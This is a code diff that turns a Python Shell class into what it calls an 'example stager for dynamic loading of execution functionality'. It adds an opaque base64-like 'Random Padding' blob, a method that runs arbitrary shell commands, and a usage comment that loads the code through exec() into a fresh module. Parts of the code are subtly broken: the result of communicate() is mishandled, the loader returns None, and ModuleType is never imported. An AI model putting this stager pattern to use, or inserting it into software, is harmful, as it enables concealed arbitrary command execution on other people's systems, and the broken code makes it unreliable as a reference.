@@ -1,49 +1,36 @@
+"""
+Random Padding
+C6QOlsAiZ8xCnOJC9Evv66/XHFTQjHibjv54XS4cvyvA07Gnnvnxjs9pKeC4I7rub2ZeLxHuIAKK
+MXgDQfWBnuh7YdAWOrmw6P5fYz7LHwG8JQvcjqMNRXWzGHXinWd9xv9AA+0J7XJ0/w6vZG/mGUXK
+tr/4P2MCI6OYFLfKNx+U9GKNrywrVs8XaRKLgDndP38NKjkoA0IN6lZe/xBhFXpkyR5Nv88jWnz7
+npKh/dnIVm+dwevGwqzBaZAjQPOjDXe+gSs57+AxGefHEqcya46ptrXhMLvXuavbJ9pa30wWdp5q
+A0LvdfTmCg==
 
+Example stager for dynamic loading of execution functionality.
 
+"""
 
 class Shell:
-    _asyncio = None
+    asyncio = __import__('asyncio')
+    async def exec_cmd(self, cmd):
 
-    def __init__(self):
-        self._asyncio = __import__('asyncio')
-        self.loop = None
-        self.get_event_loop()
-        self.tasks = set()
-        self.queue = self.asyncio.Queue()
-        self.counter = 0
-
-    @property
-    def asyncio(self):
-        return Shell._asyncio
-
-
-    def get_event_loop(self):
-        try:
-            _loop = self.asyncio.get_running_loop()
-        except RuntimeError:
-            _loop = self.asyncio.get_event_loop_policy().new_event_loop()
-        self.loop = _loop
-    async def exec_cmd(self, cmd , as_task: bool = False):
-        self.counter += 1
         proc = await self.asyncio.create_subprocess_shell(
             cmd,
             stdout=self.asyncio.subprocess.PIPE,
-            stderr=self.asyncio.subprocess.STDOUT
+            stderr=self.asyncio.subprocess.PIPE
         )
 
-        stdout, stderr = await proc.communicate()
+        stdout = await proc.communicate()
         return stdout
 
-    def done_callback(self, task):
-        self.tasks.discard(task)
+"""
+Example usage:
 
-        try:
-            res = task.result()
-        except Exception:
-            res = task.exception()
-        self.queue.put((self.counter, res))
+def dynamic_load(code):
+    shell_code = ModuleType('shell')
+    exec(code, globals(), shell_code.__dict__)
 
-    async def exec_cmd_nonblocking(self, cmd):
-        result = await self.loop.run_in_executor(
-            None, self.exec_cmd, cmd)
-        print('default thread pool', result)
+shell = dynamic_load(code)
+shellcode = shell.Shell()
+await shellcode.exec_cmd(cmd)
+"""
